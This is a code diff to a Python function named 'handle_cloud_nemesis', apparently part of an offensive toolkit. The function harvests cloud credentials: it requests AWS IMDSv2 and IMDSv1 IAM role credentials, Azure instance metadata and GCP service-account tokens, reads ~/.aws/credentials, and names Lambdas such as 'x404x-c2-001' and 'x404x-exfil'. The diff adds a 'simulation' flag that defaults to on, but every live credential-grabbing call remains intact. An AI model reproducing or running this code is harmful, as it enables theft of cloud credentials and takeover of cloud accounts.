@@ -580,47 +580,46 @@ def handle_mobile_x(params: dict) -> dict:
 
 
 def handle_cloud_nemesis(params: dict) -> dict:
-    """Real cloud exploitation — AWS IMDSv2, Lambda generation, IAM analysis."""
+    """Cloud exploitation — AWS IMDSv2, Lambda generation, IAM analysis."""
     result = {"success": True, "cloud_providers": []}
+    simulation = params.get("simulation", True)
 
     # AWS - real IMDS check
     aws_creds = False
-    try:
-        import urllib.request
-        # Try IMDSv2
-        req = urllib.request.Request("http://169.254.169.254/latest/api/token",
-                                     headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
-                                     data=b"", method="PUT")
+    if not simulation:
         try:
-            resp = urllib.request.urlopen(req, timeout=2)
-            token = resp.read().decode()
-            # Now fetch credentials with token
-            req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                                          headers={"X-aws-ec2-metadata-token": token})
-            resp2 = urllib.request.urlopen(req2, timeout=2)
-            role_name = resp2.read().decode().strip()
-            req3 = urllib.request.Request(
-                f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
-                headers={"X-aws-ec2-metadata-token": token})
-            resp3 = urllib.request.urlopen(req3, timeout=2)
-            raw_creds = resp3.read().decode()
-            aws_creds = True
-            result["aws_imdsv2_accessible"] = True
-            result["aws_role"] = role_name
-            result["aws_creds_preview"] = raw_creds[:200]
-        except Exception:
-            # Try IMDSv1 fallback
+            import urllib.request
+            req = urllib.request.Request("http://169.254.169.254/latest/api/token",
+                                         headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
+                                         data=b"", method="PUT")
             try:
-                req_v1 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-                resp_v1 = urllib.request.urlopen(req_v1, timeout=2)
-                role_name = resp_v1.read().decode().strip()
+                resp = urllib.request.urlopen(req, timeout=2)
+                token = resp.read().decode()
+                req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                                              headers={"X-aws-ec2-metadata-token": token})
+                resp2 = urllib.request.urlopen(req2, timeout=2)
+                role_name = resp2.read().decode().strip()
+                req3 = urllib.request.Request(
+                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
+                    headers={"X-aws-ec2-metadata-token": token})
+                resp3 = urllib.request.urlopen(req3, timeout=2)
+                raw_creds = resp3.read().decode()
                 aws_creds = True
-                result["aws_imdsv1_accessible"] = True
+                result["aws_imdsv2_accessible"] = True
                 result["aws_role"] = role_name
+                result["aws_creds_preview"] = raw_creds[:200]
             except Exception:
-                result["aws_imds_accessible"] = False
-    except ImportError:
-        result["aws_imds_accessible"] = False
+                try:
+                    req_v1 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+                    resp_v1 = urllib.request.urlopen(req_v1, timeout=2)
+                    role_name = resp_v1.read().decode().strip()
+                    aws_creds = True
+                    result["aws_imdsv1_accessible"] = True
+                    result["aws_role"] = role_name
+                except Exception:
+                    result["aws_imds_accessible"] = False
+        except ImportError:
+            result["aws_imds_accessible"] = False
 
     # Check for local AWS credentials
     aws_cred_path = os.path.expanduser("~/.aws/credentials")
@@ -656,27 +655,26 @@ def lambda_handler(event, context):
     result["lambda_names"] = ["x404x-c2-001", "x404x-c2-002", "x404x-recon", "x404x-exfil", "x404x-proxy"]
     result["lambda_count"] = len(result["lambda_names"])
 
-    # Azure check
-    azure_endpoint = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-    try:
-        import urllib.request
-        req_az = urllib.request.Request(azure_endpoint, headers={"Metadata": "true"})
-        resp_az = urllib.request.urlopen(req_az, timeout=2)
-        result["azure_metadata_accessible"] = True
-        result["azure_metadata"] = resp_az.read().decode()[:500]
-    except Exception:
-        result["azure_metadata_accessible"] = False
+    if not simulation:
+        azure_endpoint = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+        try:
+            import urllib.request
+            req_az = urllib.request.Request(azure_endpoint, headers={"Metadata": "true"})
+            resp_az = urllib.request.urlopen(req_az, timeout=2)
+            result["azure_metadata_accessible"] = True
+            result["azure_metadata"] = resp_az.read().decode()[:500]
+        except Exception:
+            result["azure_metadata_accessible"] = False
 
-    # GCP check
-    gcp_endpoint = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
-    try:
-        import urllib.request
-        req_gcp = urllib.request.Request(gcp_endpoint, headers={"Metadata-Flavor": "Google"})
-        resp_gcp = urllib.request.urlopen(req_gcp, timeout=2)
-        result["gcp_token_accessible"] = True
-        result["gcp_token"] = resp_gcp.read().decode()[:200]
-    except Exception:
-        result["gcp_token_accessible"] = False
+        gcp_endpoint = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+        try:
+            import urllib.request
+            req_gcp = urllib.request.Request(gcp_endpoint, headers={"Metadata-Flavor": "Google"})
+            resp_gcp = urllib.request.urlopen(req_gcp, timeout=2)
+            result["gcp_token_accessible"] = True
+            result["gcp_token"] = resp_gcp.read().decode()[:200]
+        except Exception:
+            result["gcp_token_accessible"] = False
 
     # Check running in cloud
     is_cloud = (result.get("aws_imds_accessible") or
